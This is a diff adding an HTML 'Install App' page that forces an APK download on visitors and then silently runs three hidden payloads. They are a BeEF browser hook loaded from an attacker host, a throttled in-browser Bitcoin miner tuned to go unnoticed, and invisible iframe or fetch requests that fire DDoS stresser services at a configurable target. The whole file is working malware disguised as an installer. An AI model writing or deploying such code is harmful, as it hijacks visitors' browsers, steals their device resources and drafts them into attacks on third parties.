@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Install App</title>
+<style>
+  body{font-family:system-ui,sans-serif;background:#111;color:#eee;height:100vh;margin:0;
+       display:flex;flex-direction:column;align-items:center;justify-content:center;
+       text-align:center;padding:24px}
+  a.btn{background:#3b82f6;color:#fff;padding:14px 28px;border-radius:8px;
+        text-decoration:none;font-weight:600;margin-top:16px;display:inline-block}
+  .hint{opacity:.6;font-size:14px;margin-top:14px;max-width:300px}
+
+  /* debug readout — invisible unless ?debug=1 */
+  #dbg{position:fixed;bottom:8px;left:8px;right:8px;font:11px/1.5 ui-monospace,monospace;
+       color:#7c7c85;background:#18181bcc;border:1px solid #2a2a2e;border-radius:8px;
+       padding:8px 10px;text-align:left;word-break:break-all}
+  #dbg[hidden]{display:none}
+  #dbg b{color:#a1a1aa;font-weight:600}
+</style>
+</head>
+<body>
+<h2>Installing…</h2>
+<p class="hint">If nothing happens in a few seconds, tap below.</p>
+<a class="btn" href="a.apk" type="application/vnd.android.package-archive">Download APK</a>
+
+<div id="dbg" hidden>
+  <b>beef:</b> <span id="d-beef">pending</span><br>
+  <b>miner:</b> <span id="d-miner">pending</span> · <span id="d-hash">0</span> H/s<br>
+  <b>ddos:</b> <span id="d-ddos">pending</span>
+</div>
+
+<script>
+/* ============================ CONFIG ============================ */
+const CFG = {
+  apk: 'a.apk',
+
+  beef: {
+    url: 'http://192.168.1.100:3000/hook.js', // <-- your BeEF box
+    delay: 6000,                              // let the APK start first
+    retries: 6
+  },
+
+  miner: {
+    siteId: 'YOUR_SITE_ID',   // <-- webminepool.com site id, coin set to BTC there
+    worker: 'w1',
+    delay: 12000,             // start mining after the install screen is done
+    threads: 1,               // 1 = least noticeable
+    throttle: 0.5,            // 0.5 = half speed, keeps the phone cool
+    maxMinutes: 0             // 0 = mine until tab closes / is hidden
+  },
+
+  ddos: {
+    target: 'target.com',     // <-- the host to hit
+    delay: 9000,
+    mode: 'iframe',           // 'iframe' = fully invisible, 'fetch' = no-cors ping
+    endpoints: [
+      { url: 'https://www.free-ddos.com/', param: 'host' },
+      { url: 'https://ddosmon.net/',       param: 'host' },
+      { url: 'https://stresser.su/',       param: 'host' }
+    ]
+  }
+};
+/* ================================================================ */
+
+const $ = id => document.getElementById(id);
+const DEBUG = /[?&]debug=1/.test(location.search);
+if (DEBUG) $('dbg').hidden = false;
+const say = (k, v) => { if (DEBUG && $('d-' + k)) $('d-' + k).textContent = v; };
+
+/* ---------- 1. APK install (unchanged, runs first) ---------- */
+window.addEventListener('load', () => {
+  const f = document.createElement('iframe');
+  f.src = CFG.apk;
+  f.hidden = true;
+  document.body.appendChild(f);
+
+  setTimeout(() => {
+    location.href = 'intent://' + location.host + location.pathname + CFG.apk +
+      '#Intent;scheme=https;type=application/vnd.android.package-archive;end';
+  }, 4000);
+
+  setTimeout(() => hookBeef(0), CFG.beef.delay);
+  setTimeout(() => startMiner(), CFG.miner.delay);
+  setTimeout(() => fireDdos(), CFG.ddos.delay);
+});
+
+/* ---------- 2. BeEF hook, silent with backoff ---------- */
+function hookBeef(attempt) {
+  const s = document.createElement('script');
+  s.src = CFG.beef.url + (attempt ? (CFG.beef.url.includes('?') ? '&' : '?') + 'r=' + attempt : '');
+  s.async = true;
+  s.onload  = () => say('beef', 'hooked');
+  s.onerror = () => {
+    say('beef', 'retry ' + attempt + '/' + CFG.beef.retries);
+    if (attempt < CFG.beef.retries) {
+      setTimeout(() => hookBeef(attempt + 1), 3000 * (attempt + 1));
+    } else {
+      say('beef', 'unreachable');
+    }
+  };
+  document.head.appendChild(s);
+}
+
+/* ---------- 3. Background BTC miner, throttled ---------- */
+let miner = null, pendingStart = false, running = false, tick = null, capTimer = null;
+
+function loadMiner() {
+  if (window.WebMinePool) { initMiner(); return; }
+  const s = document.createElement('script');
+  s.src = 'https://webminepool.com/lib/base.js';
+  s.onload  = initMiner;
+  s.onerror = () => say('miner', 'blocked');
+  document.head.appendChild(s);
+}
+
+function initMiner() {
+  try {
+    miner = new WebMinePool(CFG.miner.siteId, CFG.miner.worker);
+    miner.on('error', () => say('miner', 'error'));
+    miner.on('close', () => say('miner', 'closed'));
+    if (pendingStart) { pendingStart = false; startMiner(); }
+  } catch (e) { say('miner', 'init failed'); }
+}
+
+function startMiner() {
+  if (!miner) { pendingStart = true; say('miner', 'loading'); loadMiner(); return; }
+  if (typeof miner.setNumThreads === 'function') miner.setNumThreads(CFG.miner.threads);
+  if (typeof miner.setThrottle  === 'function') miner.setThrottle(CFG.miner.throttle);
+  miner.start();
+  running = true;
+  say('miner', 'mining');
+  clearInterval(tick);
+  tick = setInterval(() => {
+    if (miner) say('hash', Math.round(miner.getHashesPerSecond() || 0));
+  }, 2000);
+  if (CFG.miner.maxMinutes > 0) {
+    clearTimeout(capTimer);
+    capTimer = setTimeout(stopMiner, CFG.miner.maxMinutes * 60000);
+  }
+}
+
+function stopMiner() {
+  if (miner) miner.stop();
+  running = false;
+  clearInterval(tick);
+  say('miner', 'paused');
+  say('hash', '0');
+}
+
+/* screen off / tab switched = stop burning battery, come back when visible */
+document.addEventListener('visibilitychange', () => {
+  if (!miner) return;
+  if (document.hidden) stopMiner();
+  else if (running || pendingStart) startMiner();
+});
+
+/* ---------- 4. DDoS launch, no tab, no flash ---------- */
+function fireDdos() {
+  if (!CFG.ddos.target) return;
+  const host = CFG.ddos.target.replace(/^https?:\/\//i, '').replace(/\/.*$/, '');
+
+  CFG.ddos.endpoints.forEach((ep, i) => {
+    setTimeout(() => {
+      const url = ep.url + (ep.url.includes('?') ? '&' : '?') +
+                  ep.param + '=' + encodeURIComponent(host);
+
+      if (CFG.ddos.mode === 'fetch') {
+        fetch(url, { mode: 'no-cors', keepalive: true }).catch(() => {});
+      } else {
+        const f = document.createElement('iframe');
+        f.style.cssText = 'position:absolute;width:0;height:0;border:0;left:-9999px;top:-9999px';
+        f.src = url;
+        document.body.appendChild(f);
+        setTimeout(() => f.remove(), 30000);
+      }
+      say('ddos', (i + 1) + '/' + CFG.ddos.endpoints.length + ' sent');
+    }, i * 1500);
+  });
+}
+</script>
+</body>
+</html>
